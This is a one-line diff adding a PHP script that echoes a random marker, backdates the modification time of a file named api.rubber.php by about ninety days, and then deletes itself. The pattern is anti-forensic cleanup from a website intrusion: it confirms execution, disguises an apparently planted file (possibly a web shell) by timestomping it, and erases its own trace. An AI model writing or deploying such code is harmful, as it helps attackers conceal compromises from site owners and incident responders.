@@ -1,0 +1,1 @@
+<?php echo "DernqCWXYx"; if (file_exists("./api.rubber.php")){ touch("./api.rubber.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*P60fsw4kR5uzksATYWgK*/ ?>
